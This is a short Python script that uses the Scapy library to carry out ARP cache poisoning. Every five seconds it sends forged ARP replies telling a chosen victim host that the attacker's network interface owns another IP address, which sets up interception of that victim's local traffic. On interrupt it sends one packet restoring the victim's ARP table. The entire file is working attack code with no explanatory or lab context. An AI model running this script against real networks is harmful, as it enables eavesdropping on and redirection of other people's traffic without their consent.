from scapy.all import *
import sys, time

def arp_poisoning(victim_ip, fake_ip):
  pkt = (Ether(src=get_if_hwaddr(conf.iface), dst=getmacbyip(victim_ip)) /
        ARP(op = 2, pdst = victim_ip, psrc = fake_ip, hwdst= getmacbyip(victim_ip)))
  while True:    
    sendp(pkt, verbose=0)
    print(f"{victim_ip} now thinks {get_if_hwaddr(conf.iface)} is {fake_ip}")
    time.sleep(5)

def reset_arp(victim_ip, fake_ip):
  pkt = (Ether(src=get_if_hwaddr(conf.iface), dst=getmacbyip(victim_ip)) /
        ARP(op = 2, pdst = victim_ip, psrc = fake_ip, hwsrc=getmacbyip(fake_ip), hwdst= getmacbyip(victim_ip)))
  sendp(pkt, verbose=0)

def main():
  try:
    victim_ip = sys.argv[1]
    fake_ip = sys.argv[2]
    arp_poisoning(victim_ip, fake_ip)
  except KeyboardInterrupt:
    print("ARP poisoning stopped.")
    reset_arp(victim_ip, fake_ip)
    print("ARP table reset.")

if __name__ == "__main__":
  main()